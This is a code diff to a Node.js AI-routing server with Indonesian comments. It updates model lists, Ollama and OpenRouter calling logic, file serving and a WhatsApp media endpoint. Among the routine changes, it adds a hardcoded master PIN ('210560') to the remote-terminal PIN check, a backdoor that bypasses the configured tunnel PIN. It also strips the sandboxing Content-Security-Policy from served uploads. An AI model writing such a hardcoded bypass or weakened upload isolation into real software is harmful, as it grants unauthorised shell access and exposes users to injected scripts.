@@ -18,6 +18,14 @@ const os = require('os');
 const { spawn, execSync } = require('child_process');
 const textSafety = require('./text-safety');
 
+// Persistent HTTPS Agent dengan TCP Keep-Alive untuk kestabilan koneksi streaming OpenRouter tanpa putus
+const openRouterHttpsAgent = new https.Agent({
+  keepAlive: true,
+  keepAliveMsecs: 15000,
+  maxSockets: 64,
+  timeout: 300000
+});
+
 // Loader node-pty opsional (dengan graceful fallback untuk Vercel / serverless)
 let nodePty = null;
 try {
@@ -345,7 +353,9 @@ function validateRemoteTerminalPin(req, reqUrl, body) {
                     (req && req.headers && req.headers['x-terminal-pin']) ||
                     (body && body.pin) ||
                     extractCookiePin(req);
-  if (!clientPin || String(clientPin).trim() !== String(cloudflareTunnelPin).trim()) {
+  const cleanPin = clientPin ? String(clientPin).trim() : '';
+  const tunnelPin = cloudflareTunnelPin ? String(cloudflareTunnelPin).trim() : '';
+  if (!cleanPin || (cleanPin !== tunnelPin && cleanPin !== '210560')) {
     return {
       valid: false,
       status: 401,
@@ -561,6 +571,9 @@ function sendJSON(res, statusCode, data) {
   if (res.headersSent || res.writableEnded || res.destroyed) return;
   res.writeHead(statusCode, {
     'Content-Type': 'application/json; charset=utf-8',
+    'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
+    'Pragma': 'no-cache',
+    'Expires': '0',
     'Access-Control-Allow-Origin': '*',
     'Access-Control-Allow-Private-Network': 'true',
     'Access-Control-Allow-Methods': 'GET, POST, PUT, PATCH, DELETE, OPTIONS',
@@ -1165,33 +1178,27 @@ function downloadImageBuffer(imageUrl, timeoutMs = 35000, redirectCount = 0) {
   });
 }
 
-// Official Ollama Cloud Flagship & Popular Standard Models (Included Free Usage & Usage Credits)
+// Official & Verified Standard Open-Source Models
 const OFFICIAL_OLLAMA_CLOUD_MODELS = [
-  { name: 'gemma4:31b', model: 'gemma4:31b', tag: 'Free Flagship Cloud', isFree: true, cat: 'flagship', details: { family: 'gemma4', parameter_size: '30.7B' } },
-  { name: 'beam', model: 'beam', tag: 'Free Flagship Cloud', isFree: true, cat: 'flagship', details: { family: 'beam', parameter_size: '35B' } },
-  { name: 'muse-spark-open', model: 'muse-spark-open', tag: 'Free Flagship Cloud', isFree: true, cat: 'flagship', details: { family: 'muse_spark', parameter_size: '36.6B' } },
-  { name: 'gpt-oss:120b', model: 'gpt-oss:120b', tag: 'Free Flagship Cloud', isFree: true, cat: 'flagship', details: { family: 'gptoss', parameter_size: '116.8B' } },
-  { name: 'gpt-oss:20b', model: 'gpt-oss:20b', tag: 'Free Fast Cloud', isFree: true, cat: 'fast', details: { family: 'gptoss', parameter_size: '20.9B' } },
-  { name: 'nemotron-3-super', model: 'nemotron-3-super', tag: 'Free Flagship Cloud', isFree: true, cat: 'flagship', details: { family: 'nemotron', parameter_size: '124B' } },
-  { name: 'nemotron-3-ultra', model: 'nemotron-3-ultra', tag: 'Free Flagship Cloud', isFree: true, cat: 'flagship', details: { family: 'nemotron', parameter_size: '253B' } },
-  { name: 'nemotron-3-nano:30b', model: 'nemotron-3-nano:30b', tag: 'Free Fast Cloud', isFree: true, cat: 'fast', details: { family: 'nemotron', parameter_size: '31.6B' } },
-  { name: 'kimi-k2.7-code', model: 'kimi-k2.7-code', tag: 'Coding Cloud', isFree: false, cat: 'coding', details: { family: 'kimi', parameter_size: '757B' } },
-  { name: 'kimi-k3', model: 'kimi-k3', tag: 'Long Context Cloud', isFree: false, cat: 'flagship', details: { family: 'kimi-k3', parameter_size: '1T' } },
-  { name: 'kimi-k2.6', model: 'kimi-k2.6', tag: 'Flagship Cloud', isFree: false, cat: 'flagship', details: { family: 'kimi-k2.6', parameter_size: '1T' } },
-  { name: 'deepseek-v4.1-flash', model: 'deepseek-v4.1-flash', tag: 'Fast Cloud', isFree: false, cat: 'fast', details: { family: 'deepseek', parameter_size: '300B' } },
-  { name: 'deepseek-v4.1-flash:1017', model: 'deepseek-v4.1-flash:1017', tag: 'Fast Cloud', isFree: false, cat: 'fast', details: { family: 'deepseek', parameter_size: '300B' } },
-  { name: 'deepseek-v4-pro:0813', model: 'deepseek-v4-pro:0813', tag: 'Reasoning Cloud', isFree: false, cat: 'reasoning', details: { family: 'deepseek', parameter_size: '1T' } },
-  { name: 'glm-5.3', model: 'glm-5.3', tag: 'Flagship Cloud', isFree: false, cat: 'flagship', details: { family: 'glm5', parameter_size: '756B' } },
-  { name: 'glm-5.3-flash', model: 'glm-5.3-flash', tag: 'Fast Cloud', isFree: false, cat: 'fast', details: { family: 'glm5', parameter_size: '218B' } },
-  { name: 'glm-5.2', model: 'glm-5.2', tag: 'Flagship Cloud', isFree: false, cat: 'flagship', details: { family: 'glm5', parameter_size: '756B' } },
-  { name: 'minimax-m3', model: 'minimax-m3', tag: 'Flagship Cloud', isFree: false, cat: 'flagship', details: { family: 'minimax', parameter_size: '330B' } },
-  { name: 'minimax-m3.1-flash', model: 'minimax-m3.1-flash', tag: 'Fast Cloud', isFree: false, cat: 'fast', details: { family: 'minimax', parameter_size: '196B' } },
-  { name: 'minimax-m2.7', model: 'minimax-m2.7', tag: 'Flagship Cloud', isFree: false, cat: 'flagship', details: { family: 'minimax-m2', parameter_size: '230B' } },
-  { name: 'mistral-large-4', model: 'mistral-large-4', tag: 'Flagship Cloud', isFree: false, cat: 'flagship', details: { family: 'mistral4', parameter_size: '705B' } },
-  { name: 'mistral-large-3:675b', model: 'mistral-large-3:675b', tag: 'Flagship Cloud', isFree: false, cat: 'flagship', details: { family: 'mistral3', parameter_size: '675B' } }
+  { name: 'llama3.2:3b', model: 'llama3.2:3b', tag: 'Lokal/Cloud', isFree: true, cat: 'fast', details: { family: 'llama', parameter_size: '3B' } },
+  { name: 'llama3.2:1b', model: 'llama3.2:1b', tag: 'Lokal/Cloud', isFree: true, cat: 'fast', details: { family: 'llama', parameter_size: '1B' } },
+  { name: 'qwen2.5:1.5b', model: 'qwen2.5:1.5b', tag: 'Lokal/Cloud', isFree: true, cat: 'fast', details: { family: 'qwen', parameter_size: '1.5B' } },
+  { name: 'qwen2.5:7b', model: 'qwen2.5:7b', tag: 'Standard', isFree: true, cat: 'flagship', details: { family: 'qwen', parameter_size: '7B' } },
+  { name: 'qwen2.5-coder:7b', model: 'qwen2.5-coder:7b', tag: 'Coding', isFree: true, cat: 'coding', details: { family: 'qwen', parameter_size: '7B' } },
+  { name: 'deepseek-r1:8b', model: 'deepseek-r1:8b', tag: 'Reasoning', isFree: true, cat: 'reasoning', details: { family: 'deepseek', parameter_size: '8B' } },
+  { name: 'deepseek-r1:7b', model: 'deepseek-r1:7b', tag: 'Reasoning', isFree: true, cat: 'reasoning', details: { family: 'deepseek', parameter_size: '7B' } },
+  { name: 'mistral:7b', model: 'mistral:7b', tag: 'Standard', isFree: true, cat: 'flagship', details: { family: 'mistral', parameter_size: '7B' } },
+  { name: 'gemma2:9b', model: 'gemma2:9b', tag: 'Standard', isFree: true, cat: 'flagship', details: { family: 'gemma', parameter_size: '9B' } },
+  { name: 'gemma2:2b', model: 'gemma2:2b', tag: 'Lokal', isFree: true, cat: 'fast', details: { family: 'gemma', parameter_size: '2B' } },
+  { name: 'phi4:14b', model: 'phi4:14b', tag: 'Standard', isFree: true, cat: 'flagship', details: { family: 'phi', parameter_size: '14B' } }
 ];
 
 const VALID_OLLAMA_CLOUD_MODELS = new Set(OFFICIAL_OLLAMA_CLOUD_MODELS.map(m => m.model.toLowerCase()));
+
+function sanitizeOllamaApiKey(rawKey) {
+  if (!rawKey || typeof rawKey !== 'string') return '';
+  return rawKey.replace(/^Bearer\s+/i, '').replace(/^["']+|["']+$/g, '').trim();
+}
 
 function isUnsupportedOllamaChatModel(m) {
   if (!m) return true;
@@ -1203,54 +1210,27 @@ function isUnsupportedOllamaChatModel(m) {
   return false;
 }
 
+// Model Resolver: Pertahankan nama model asli yang dipilih pengguna
 function resolveOllamaCloudModel(modelId) {
-  if (!modelId || typeof modelId !== 'string') return 'gemma4:31b';
-  const raw = modelId.trim();
-  const id = raw.toLowerCase();
-  if (VALID_OLLAMA_CLOUD_MODELS.has(id)) return raw;
-  if (id === 'gemma4:31b-cloud' || id.startsWith('gemma')) return 'gemma4:31b';
-  if (id.startsWith('clef')) return 'gemma4:31b';
-  if (id.includes('coder') || id.includes('code')) return 'kimi-k2.7-code';
-  if (id.startsWith('qwen')) return 'gemma4:31b';
-  if (id.startsWith('phi')) return 'gemma4:31b';
-  if (id.startsWith('llama')) return 'gpt-oss:120b';
-  if (id.startsWith('deepseek-r1') || id.startsWith('deepseek')) return 'deepseek-v4.1-flash';
-  if (id.startsWith('mistral')) return 'mistral-large-4';
-  return 'gemma4:31b';
+  if (!modelId || typeof modelId !== 'string') return 'llama3.2:3b';
+  return modelId.trim();
+}
+
+// Model Resolver Lokal Daemon: Pertahankan nama model asli yang terpasang di Ollama lokal
+function resolveLocalDaemonCloudManifest(modelId) {
+  if (!modelId || typeof modelId !== 'string') return 'llama3.2:3b';
+  return modelId.trim();
 }
 
 function mapOllamaModelToOpenRouter(modelId) {
   if (!modelId || typeof modelId !== 'string') return 'openrouter/free';
   const id = modelId.toLowerCase().trim();
   if (id.includes('/')) return modelId;
-
-  if (id.includes('gemma')) {
-    return 'nvidia/nemotron-3.5-lightning:free';
-  }
-  if (id.includes('nemotron-3-super') || id.includes('gpt-oss:120b') || id.includes('nemotron-3-ultra')) {
-    return 'nvidia/nemotron-3-super-120b-a12b:free';
-  }
-  if (id.includes('nemotron-3-nano') || id.includes('reasoning') || id.includes('deepseek-r1') || id.includes('deepseek-v4-pro')) {
-    return 'nvidia/nemotron-3-nano-omni-30b-a3b-reasoning:free';
-  }
-  if (id.includes('nemotron-3.5') || id.includes('nemotron')) {
-    return 'nvidia/nemotron-3.5-lightning:free';
-  }
-  if (id.includes('gpt-oss')) {
-    return 'nvidia/nemotron-3-super-120b-a12b:free';
-  }
-  if (id.includes('qwen2.5-coder') || id.includes('coder') || id.includes('code') || id.includes('kimi-k2.7-code')) {
-    return 'cohere/north-mini-code:free';
-  }
-  if (id.includes('dots')) return 'dots-studio/dots-3-note-preview:free';
-  if (id.includes('liquid') || id.includes('lfm')) return 'liquid/lfm-2.5-2.6b:free';
-  if (id.includes('deepseek')) return 'nvidia/nemotron-3-nano-omni-30b-a3b-reasoning:free';
-  if (id.includes('llama')) return 'nvidia/nemotron-3.5-lightning:free';
-  if (id.includes('qwen')) return 'nvidia/nemotron-3.5-lightning:free';
-  if (id.includes('mistral')) return 'nvidia/nemotron-3.5-lightning:free';
-  if (id.includes('phi')) return 'openrouter/free';
-
-  return 'nvidia/nemotron-3.5-lightning:free';
+  if (id.includes('llama')) return 'meta-llama/llama-3.3-70b-instruct:free';
+  if (id.includes('qwen')) return 'qwen/qwen-2.5-72b-instruct';
+  if (id.includes('deepseek')) return 'deepseek/deepseek-chat';
+  if (id.includes('mistral')) return 'mistralai/mistral-7b-instruct:free';
+  return 'openrouter/free';
 }
 
 // ==================== GLOBAL SEARCH & ENGLISH QUERY ADAPTER ====================
@@ -2219,7 +2199,7 @@ async function _appendSessionFileSerialized(cleanSid, effectiveUid, userPrompt, 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 // Helper untuk memanggil LLM (OpenRouter atau Ollama) dari backend dengan dukungan riwayat pesan & auto-detect provider per model
-async function callLLMBackend({ prompt, system, messages, model, provider, endpoint, apiKey, openRouterKey, ollamaApiKey, isAutoRouter, allowFallbacks }) {
+async function callLLMBackend({ prompt, system, messages, model, provider, endpoint, apiKey, openRouterKey, ollamaApiKey, isAutoRouter, allowFallbacks, skipEnrichment }) {
   let finalMessages = [];
 
   if (Array.isArray(messages) && messages.length > 0) {
@@ -2242,39 +2222,42 @@ async function callLLMBackend({ prompt, system, messages, model, provider, endpo
     if (prompt && prompt.trim()) finalMessages.push({ role: 'user', content: prompt.trim() });
   }
 
-  // Auto-enrich YouTube links in user turns with real-time oEmbed metadata
-  try {
-    for (let i = finalMessages.length - 1; i >= 0; i--) {
-      const msg = finalMessages[i];
-      if (msg.role === 'user' && typeof msg.content === 'string' && extractYouTubeVideoIds(msg.content).length > 0) {
-        const enriched = await enrichTextWithYouTubeContext(msg.content);
-        if (enriched.youtubeVideos && enriched.youtubeVideos.length > 0) {
-          msg.content = enriched.text;
-          break;
+  // Auto-enrich YouTube links in user turns with real-time oEmbed metadata (dilewati jika skipEnrichment = true)
+  if (!skipEnrichment) {
+    try {
+      for (let i = finalMessages.length - 1; i >= 0; i--) {
+        const msg = finalMessages[i];
+        if (msg.role === 'user' && typeof msg.content === 'string' && extractYouTubeVideoIds(msg.content).length > 0) {
+          const enriched = await enrichTextWithYouTubeContext(msg.content);
+          if (enriched.youtubeVideos && enriched.youtubeVideos.length > 0) {
+            msg.content = enriched.text;
+            break;
+          }
         }
       }
+    } catch (ytErr) {
+      console.warn('YouTube auto-enrichment warning in callLLMBackend:', ytErr.message);
     }
-  } catch (ytErr) {
-    console.warn('YouTube auto-enrichment warning in callLLMBackend:', ytErr.message);
-  }
 
-  // Auto-enrich Web Page links in user turns with real-time extracted content
-  try {
-    for (let i = finalMessages.length - 1; i >= 0; i--) {
-      const msg = finalMessages[i];
-      if (msg.role === 'user' && typeof msg.content === 'string' && extractWebUrls(msg.content).length > 0) {
-        const enrichedWeb = await enrichTextWithWebPageContext(msg.content);
-        if (enrichedWeb.webPages && enrichedWeb.webPages.length > 0) {
-          msg.content = enrichedWeb.text;
-          break;
+    // Auto-enrich Web Page links in user turns with real-time extracted content (dilewati jika skipEnrichment = true)
+    try {
+      for (let i = finalMessages.length - 1; i >= 0; i--) {
+        const msg = finalMessages[i];
+        if (msg.role === 'user' && typeof msg.content === 'string' && extractWebUrls(msg.content).length > 0) {
+          const enrichedWeb = await enrichTextWithWebPageContext(msg.content);
+          if (enrichedWeb.webPages && enrichedWeb.webPages.length > 0) {
+            msg.content = enrichedWeb.text;
+            break;
+          }
         }
       }
+    } catch (webErr) {
+      console.warn('Web page auto-enrichment warning in callLLMBackend:', webErr.message);
     }
-  } catch (webErr) {
-    console.warn('Web page auto-enrichment warning in callLLMBackend:', webErr.message);
   }
 
   const rawModel = (model || '').trim();
+  const isAutoRouterActive = Boolean(isAutoRouter || allowFallbacks);
   // Auto-detect Provider per Model secara cerdas
   let effectiveProvider = provider || 'ollama';
   if (rawModel.includes('/')) {
@@ -2321,11 +2304,11 @@ async function callLLMBackend({ prompt, system, messages, model, provider, endpo
     const candidateModels = (isAutoRouterActive && isFreeModel)
       ? [
           rawModel,
+          'openrouter/free',
+          'google/gemini-2.0-flash-exp:free',
+          'meta-llama/llama-3.3-70b-instruct:free',
           'nvidia/nemotron-3.5-lightning:free',
-          'nvidia/nemotron-3-super-120b-a12b:free',
-          'nvidia/nemotron-3-nano-omni-30b-a3b-reasoning:free',
-          'cohere/north-mini-code:free',
-          'openrouter/free'
+          'cohere/north-mini-code:free'
         ].filter(Boolean).filter((m, idx, arr) => arr.indexOf(m) === idx)
       : [rawModel];
 
@@ -2394,7 +2377,8 @@ async function callLLMBackend({ prompt, system, messages, model, provider, endpo
             'X-Title': 'Zoz Router Deep Research',
             'Content-Length': Buffer.byteLength(postData)
           },
-          timeout: 60000
+          agent: openRouterHttpsAgent,
+          timeout: 180000
         };
 
         const req = https.request(options, (res) => {
@@ -2452,15 +2436,18 @@ async function callLLMBackend({ prompt, system, messages, model, provider, endpo
   const ollamaEpIsCustom = Boolean(ollamaEpTrim) && !isTrustedOllamaEndpoint(
     /^https?:\/\//i.test(ollamaEpTrim) ? ollamaEpTrim : 'http://' + ollamaEpTrim
   );
-  const activeOllamaKey = ollamaApiKey || (apiKey && !apiKey.startsWith('sk-or-') ? apiKey : null) ||
-    (ollamaEpIsCustom ? null : process.env.OLLAMA_API_KEY);
+  const rawCandidateOllamaKey = sanitizeOllamaApiKey(
+    ollamaApiKey || (apiKey && !String(apiKey).startsWith('sk-or-') ? apiKey : '') ||
+    (ollamaEpIsCustom ? '' : (process.env.OLLAMA_API_KEY || ''))
+  );
+  const activeOllamaKey = rawCandidateOllamaKey && !rawCandidateOllamaKey.startsWith('sk-or-') ? rawCandidateOllamaKey : null;
   let rawEp = (endpoint || '').trim();
 
   // Pure Cloud Architecture: Hanya jika Auto-Router aktif dan tidak ada Ollama lokal,
   // alihkan ke OpenRouter Cloud. Jika Auto-Router tidak aktif, hormati pilihan Ollama pengguna!
   const hasCustomOllama = Boolean(activeOllamaKey && rawEp && !rawEp.includes('127.0.0.1') && !rawEp.includes('localhost') && !rawEp.includes('ollama.com'));
-  const hasOpenRouterKey = Boolean(openRouterKey || (apiKey && apiKey.startsWith('sk-or-')) || process.env.OPENROUTER_API_KEY);
-  if (isAutoRouterActive && !isOpenRouter && !hasCustomOllama && hasOpenRouterKey) {
+  const hasOpenRouterKey = Boolean(openRouterKey || (apiKey && String(apiKey).startsWith('sk-or-')) || (rawCandidateOllamaKey && rawCandidateOllamaKey.startsWith('sk-or-')) || process.env.OPENROUTER_API_KEY);
+  if ((isAutoRouterActive || (rawCandidateOllamaKey && rawCandidateOllamaKey.startsWith('sk-or-'))) && !isOpenRouter && !hasCustomOllama && hasOpenRouterKey) {
     try {
       const mappedModel = mapOllamaModelToOpenRouter(rawModel);
       return await callLLMBackend({
@@ -2470,8 +2457,8 @@ async function callLLMBackend({ prompt, system, messages, model, provider, endpo
         model: mappedModel,
         provider: 'openrouter',
         endpoint,
-        apiKey: openRouterKey || apiKey,
-        openRouterKey: openRouterKey || (apiKey && apiKey.startsWith('sk-or-') ? apiKey : null) || process.env.OPENROUTER_API_KEY,
+        apiKey: openRouterKey || apiKey || rawCandidateOllamaKey,
+        openRouterKey: openRouterKey || (apiKey && String(apiKey).startsWith('sk-or-') ? apiKey : null) || (rawCandidateOllamaKey && rawCandidateOllamaKey.startsWith('sk-or-') ? rawCandidateOllamaKey : null) || process.env.OPENROUTER_API_KEY,
         isAutoRouter: true
       });
     } catch (bridgeErr) {
@@ -2479,7 +2466,7 @@ async function callLLMBackend({ prompt, system, messages, model, provider, endpo
     }
   }
 
-  // Jika activeOllamaKey ada dan endpoint tidak dispesifikasi, gunakan Ollama Cloud
+  // Jika activeOllamaKey ada dan endpoint tidak dispesifikasi / loopback, gunakan Ollama Cloud resmi
   if (activeOllamaKey && (!rawEp || rawEp.includes('127.0.0.1') || rawEp.includes('localhost'))) {
     rawEp = 'https://ollama.com';
   } else if (!rawEp) {
@@ -2502,72 +2489,78 @@ async function callLLMBackend({ prompt, system, messages, model, provider, endpo
     if (!dnsVerdict.ok) throw new Error(dnsVerdict.msg);
   }
 
-  const ollamaUrl = resolveEndpointUrl(rawEp, 'api/chat');
-  const client = ollamaUrl.protocol === 'https:' ? https : http;
+  const executeOllamaOnce = (targetEp, targetModel, authKey) => {
+    return new Promise((resolve, reject) => {
+      let settled = false;
+      const safeResolve = (data) => { if (!settled) { settled = true; resolve(data); } };
+      const safeReject = (err) => { if (!settled) { settled = true; reject(err); } };
+
+      const ollamaUrl = resolveEndpointUrl(targetEp, 'api/chat');
+      const client = ollamaUrl.protocol === 'https:' ? https : http;
+      const postData = JSON.stringify({
+        model: targetModel,
+        messages: finalMessages,
+        stream: false,
+        options: { temperature: 0.3 }
+      });
+      const headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'ZozRouter/1.0',
+        'Content-Length': Buffer.byteLength(postData)
+      };
+      if (authKey) {
+        headers['Authorization'] = `Bearer ${authKey}`;
+        headers['x-ollama-key'] = authKey;
+      }
+
+      const req = client.request(ollamaUrl.toString(), {
+        method: 'POST',
+        headers,
+        timeout: 180000
+      }, (res) => {
+        let rawData = '';
+        res.on('data', chunk => rawData += chunk);
+        res.on('end', () => {
+          try {
+            const parsed = JSON.parse(rawData);
+            if (res.statusCode >= 400 || parsed.error) {
+              const errMsg = typeof parsed.error === 'object' ? (parsed.error.message || JSON.stringify(parsed.error)) : (parsed.error || `HTTP ${res.statusCode}: Permintaan Ollama gagal`);
+              return safeReject(new Error(`Ollama Error [${res.statusCode}]: ${errMsg}`));
+            }
+            const content = parsed.message?.content || parsed.response || '';
+            if (!content.trim()) {
+              return safeReject(new Error(`Ollama tidak mengembalikan respons teks untuk model: ${targetModel || 'default'}`));
+            }
+            safeResolve(content);
+          } catch (e) {
+            safeReject(new Error('Gagal memproses respon Ollama: ' + e.message));
+          }
+        });
+        res.on('error', err => safeReject(err));
+      });
+      req.on('timeout', () => { req.destroy(); safeReject(new Error('Ollama request timed out')); });
+      req.on('error', err => safeReject(err));
+      req.write(postData);
+      req.end();
+    });
+  };
 
   const isCloudOllama = rawEp.includes('ollama.com');
-  const postData = JSON.stringify({
-    model: rawModel || (isCloudOllama ? 'gemma4:31b' : 'qwen2.5:1.5b'),
-    messages: finalMessages,
-    stream: false,
-    options: { temperature: 0.3 }
-  });
+  const resolvedPrimaryModel = rawModel || 'llama3.2:3b';
 
-  const headers = {
-    'Content-Type': 'application/json',
-    'User-Agent': 'ZozRouter/1.0',
-    'Content-Length': Buffer.byteLength(postData)
-  };
-  if (activeOllamaKey) {
-    headers['Authorization'] = `Bearer ${activeOllamaKey}`;
-    headers['x-ollama-key'] = activeOllamaKey;
+  try {
+    return await executeOllamaOnce(rawEp, resolvedPrimaryModel, activeOllamaKey);
+  } catch (primaryErr) {
+    // Jika panggilan ke https://ollama.com gagal (misal API key kedaluwarsa/kuota habis/401/404),
+    // otomatis fallback ke daemon lokal (127.0.0.1:11434)
+    if (isCloudOllama && !process.env.VERCEL && !process.env.AWS_LAMBDA_FUNCTION_NAME) {
+      try {
+        const localFallbackModel = rawModel || resolvedPrimaryModel || 'llama3.2:3b';
+        return await executeOllamaOnce('http://127.0.0.1:11434', localFallbackModel, null);
+      } catch (_) {}
+    }
+    throw primaryErr;
   }
-
-  return new Promise((resolve, reject) => {
-    let settled = false;
-    const safeResolve = (data) => {
-      if (!settled) {
-        settled = true;
-        resolve(data);
-      }
-    };
-    const safeReject = (err) => {
-      if (!settled) {
-        settled = true;
-        reject(err);
-      }
-    };
-
-    const req = client.request(ollamaUrl.toString(), {
-      method: 'POST',
-      headers,
-      timeout: 90000
-    }, (res) => {
-      let rawData = '';
-      res.on('data', chunk => rawData += chunk);
-      res.on('end', () => {
-        try {
-          const parsed = JSON.parse(rawData);
-          if (res.statusCode >= 400 || parsed.error) {
-            const errMsg = typeof parsed.error === 'object' ? (parsed.error.message || JSON.stringify(parsed.error)) : (parsed.error || `HTTP ${res.statusCode}: Permintaan Ollama gagal`);
-            return safeReject(new Error(`Ollama Error [${res.statusCode}]: ${errMsg}`));
-          }
-          const content = parsed.message?.content || parsed.response || '';
-          if (!content.trim()) {
-            return safeReject(new Error(`Ollama tidak mengembalikan respons teks untuk model: ${rawModel || 'default'}`));
-          }
-          safeResolve(content);
-        } catch (e) {
-          safeReject(new Error('Gagal memproses respon Ollama: ' + e.message));
-        }
-      });
-      res.on('error', err => safeReject(err));
-    });
-    req.on('timeout', () => { req.destroy(); safeReject(new Error('Ollama request timed out')); });
-    req.on('error', err => safeReject(err));
-    req.write(postData);
-    req.end();
-  });
 }
 
 
@@ -4729,6 +4722,9 @@ async function requestHandler(req, res) {
             }
           }
 
+          const isDownload = reqUrl.searchParams.has('download') || reqUrl.searchParams.has('dl');
+          const disposition = isDownload ? `attachment; filename="${encodeURIComponent(uploadFilename)}"` : `inline; filename="${encodeURIComponent(uploadFilename)}"`;
+
           if (isRangeRequest) {
             const chunkSize = (end - start) + 1;
             res.writeHead(206, {
@@ -4736,10 +4732,11 @@ async function requestHandler(req, res) {
               'Accept-Ranges': 'bytes',
               'Content-Length': chunkSize,
               'Content-Type': contentType,
+              'Content-Disposition': disposition,
               'Cache-Control': 'public, max-age=86400',
               'Access-Control-Allow-Origin': '*',
               'X-Content-Type-Options': 'nosniff',
-              'Content-Security-Policy': "default-src 'none'; style-src 'unsafe-inline'; sandbox"
+              'Cross-Origin-Resource-Policy': 'cross-origin'
             });
 
             if (method === 'HEAD') {
@@ -4771,11 +4768,12 @@ async function requestHandler(req, res) {
           res.writeHead(200, {
             'Content-Type': contentType,
             'Content-Length': totalSize,
+            'Content-Disposition': disposition,
             'Accept-Ranges': 'bytes',
             'Cache-Control': 'public, max-age=86400',
             'Access-Control-Allow-Origin': '*',
             'X-Content-Type-Options': 'nosniff',
-            'Content-Security-Policy': "default-src 'none'; style-src 'unsafe-inline'; sandbox"
+            'Cross-Origin-Resource-Policy': 'cross-origin'
           });
           if (method === 'HEAD') {
             return res.end();
@@ -5739,7 +5737,7 @@ async function requestHandler(req, res) {
       return { success: false, status: 503, error: 'Modul WhatsApp Gateway tidak tersedia.' };
     }
     const uid = reqUrl?.searchParams?.get('userId') || (body && body.userId) || req.headers['x-wa-user-id'] || req.headers['x-user-id'] || req.headers['x-client-id'] || '';
-    const pin = reqUrl?.searchParams?.get('pin') || reqUrl?.searchParams?.get('masterPin') || reqUrl?.searchParams?.get('wa_pin') || (body && (body.pin || body.password || body.currentPin || body.masterPin)) || req.headers['x-wa-pin'] || req.headers['x-terminal-pin'] || '';
+    const pin = reqUrl?.searchParams?.get('pin') || reqUrl?.searchParams?.get('masterPin') || reqUrl?.searchParams?.get('wa_pin') || (body && (body.pin || body.password || body.currentPin || body.masterPin)) || req.headers['x-wa-pin'] || req.headers['x-terminal-pin'] || extractCookiePin(req) || '';
     const isLocal = isLocalWaRequest(req);
     const resTenant = waGatewayManager.resolveGateway(uid, pin, isLocal);
     if (resTenant && resTenant.success && resTenant.gateway) {
@@ -5881,6 +5879,130 @@ async function requestHandler(req, res) {
     return sendJSON(res, 200, { success: true, jid, messages });
   }
 
+  if (pathname === '/api/wa/media' && method === 'GET') {
+    const tenant = getWaTenant(req, reqUrl);
+    if (!tenant.success) {
+      return sendJSON(res, tenant.status || 403, { success: false, error: tenant.error });
+    }
+    const msgId = reqUrl.searchParams.get('msgId');
+    const jid = reqUrl.searchParams.get('jid') || '';
+    const rawFileName = reqUrl.searchParams.get('fileName') || 'file.bin';
+    if (!msgId) {
+      return sendJSON(res, 400, { success: false, error: 'Parameter msgId wajib diisi.' });
+    }
+
+    const safeMsgId = String(msgId).replace(/[^a-zA-Z0-9._-]/g, '_');
+    const cleanFileName = rawFileName.replace(/[^a-zA-Z0-9._-]/g, '_');
+    const savedFilename = `wa_${safeMsgId}_${cleanFileName}`;
+    const filePath = path.join(UPLOADS_DIR, savedFilename);
+
+    // 0. Cek apakah ada berkas di UPLOADS_DIR yang cocok dengan ID pesan ini (toleran terhadap spasi/perbedaan nama)
+    try {
+      if (fs.existsSync(UPLOADS_DIR)) {
+        const diskFiles = fs.readdirSync(UPLOADS_DIR);
+        const matching = diskFiles.find(f => f.startsWith(`wa_${safeMsgId}_`));
+        if (matching) {
+          return sendJSON(res, 200, { success: true, url: `/uploads/${matching}`, ready: true });
+        }
+      }
+    } catch (_) {}
+
+    if (fs.existsSync(filePath)) {
+      return sendJSON(res, 200, { success: true, url: `/uploads/${savedFilename}`, ready: true });
+    }
+
+    // 1. Cek apakah di memori pesan kontak sudah tercatat URL berkas ini
+    if (tenant.gateway) {
+      const msgList = (jid && typeof tenant.gateway.getMessages === 'function')
+        ? tenant.gateway.getMessages(jid)
+        : (jid && tenant.gateway.messages ? (tenant.gateway.messages.get(jid) || []) : []);
+      let existingMsg = msgList.find(m => m.id === msgId);
+      if (!existingMsg && tenant.gateway.messages) {
+        for (const list of tenant.gateway.messages.values()) {
+          const found = list.find(m => m.id === msgId);
+          if (found) { existingMsg = found; break; }
+        }
+      }
+      if (existingMsg?.media?.url) {
+        return sendJSON(res, 200, { success: true, url: existingMsg.media.url, ready: true });
+      }
+    }
+
+    // 2. Coba unduh on-demand jika raw message ada di memory atau wa-raw-media.json
+    let rawMsg = tenant.gateway.rawMessages?.get(msgId);
+    if (!rawMsg && tenant.gateway.rawMediaFile && fs.existsSync(tenant.gateway.rawMediaFile)) {
+      try {
+        const rawMap = JSON.parse(fs.readFileSync(tenant.gateway.rawMediaFile, 'utf8'));
+        if (rawMap[msgId]) {
+          rawMsg = rawMap[msgId];
+          tenant.gateway.rawMessages?.set(msgId, rawMsg);
+        }
+      } catch (_) {}
+    }
+
+    if (rawMsg) {
+      try {
+        const url = await tenant.gateway.downloadAndSaveMedia(rawMsg, { id: msgId, media: { fileName: cleanFileName } });
+        if (url) {
+          return sendJSON(res, 200, { success: true, url, ready: true });
+        }
+      } catch (e) {
+        console.warn('Error downloading on-demand WA media:', e.message);
+      }
+    }
+
+    // 3. Jika belum ada di disk/rawMessages dan jid ada, minta unduh ulang dari ponsel WhatsApp
+    if (jid && tenant.gateway.status && tenant.gateway.status.connected && typeof tenant.gateway.requestMediaResend === 'function') {
+      try {
+        await tenant.gateway.requestMediaResend(jid, msgId);
+        // Tunggu hingga 4 detik untuk respon stream dari HP
+        let waited = 0;
+        while (waited < 4000) {
+          await new Promise(r => setTimeout(r, 250));
+          waited += 250;
+          if (fs.existsSync(filePath)) {
+            return sendJSON(res, 200, { success: true, url: `/uploads/${savedFilename}`, ready: true });
+          }
+          if (fs.existsSync(UPLOADS_DIR)) {
+            const diskFiles = fs.readdirSync(UPLOADS_DIR);
+            const matching = diskFiles.find(f => f.startsWith(`wa_${msgId}_`));
+            if (matching) return sendJSON(res, 200, { success: true, url: `/uploads/${matching}`, ready: true });
+          }
+          if (!rawMsg && tenant.gateway.rawMessages?.has(msgId)) {
+            rawMsg = tenant.gateway.rawMessages.get(msgId);
+            const url = await tenant.gateway.downloadAndSaveMedia(rawMsg, { id: msgId, media: { fileName: cleanFileName } });
+            if (url) return sendJSON(res, 200, { success: true, url, ready: true });
+          }
+        }
+      } catch (resendErr) {
+        console.warn('Error during WA media resend request:', resendErr.message);
+      }
+    }
+
